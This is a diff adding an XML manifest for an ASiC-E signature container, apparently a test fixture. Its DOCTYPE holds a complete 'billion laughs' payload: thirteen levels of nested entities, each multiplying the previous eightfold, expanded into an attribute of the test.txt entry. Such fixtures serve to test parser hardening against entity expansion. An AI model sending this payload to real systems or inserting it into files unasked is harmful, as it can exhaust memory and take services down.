@@ -1,0 +1,21 @@
+<?xml version="1.0" encoding="UTF-8" standalone="no" ?>
+<!DOCTYPE data [
+<!ENTITY ent0 "LoL">
+<!ENTITY ent1 "&ent0;&ent0;&ent0;&ent0;&ent0;&ent0;&ent0;&ent0;">
+<!ENTITY ent2 "&ent1;&ent1;&ent1;&ent1;&ent1;&ent1;&ent1;&ent1;">
+<!ENTITY ent3 "&ent2;&ent2;&ent2;&ent2;&ent2;&ent2;&ent2;&ent2;">
+<!ENTITY ent4 "&ent3;&ent3;&ent3;&ent3;&ent3;&ent3;&ent3;&ent3;">
+<!ENTITY ent5 "&ent4;&ent4;&ent4;&ent4;&ent4;&ent4;&ent4;&ent4;">
+<!ENTITY ent6 "&ent5;&ent5;&ent5;&ent5;&ent5;&ent5;&ent5;&ent5;">
+<!ENTITY ent7 "&ent6;&ent6;&ent6;&ent6;&ent6;&ent6;&ent6;&ent6;">
+<!ENTITY ent8 "&ent7;&ent7;&ent7;&ent7;&ent7;&ent7;&ent7;&ent7;">
+<!ENTITY ent9 "&ent8;&ent8;&ent8;&ent8;&ent8;&ent8;&ent8;&ent8;">
+<!ENTITY ent10 "&ent9;&ent9;&ent9;&ent9;&ent9;&ent9;&ent9;&ent9;">
+<!ENTITY ent11 "&ent10;&ent10;&ent10;&ent10;&ent10;&ent10;&ent10;&ent10;">
+<!ENTITY ent12 "&ent11;&ent11;&ent11;&ent11;&ent11;&ent11;&ent11;&ent11;">
+<!ENTITY ent13 "&ent12;&ent12;&ent12;&ent12;&ent12;&ent12;&ent12;&ent12;">
+]>
+<manifest:manifest xmlns:manifest="urn:oasis:names:tc:opendocument:xmlns:manifest:1.0">
+  <manifest:file-entry manifest:full-path="/" manifest:media-type="application/vnd.etsi.asic-e+zip"/>
+  <manifest:file-entry manifest:full-path="test.txt" manifest:media-type="application/octet-stream" x="&ent13;" />
+</manifest:manifest>
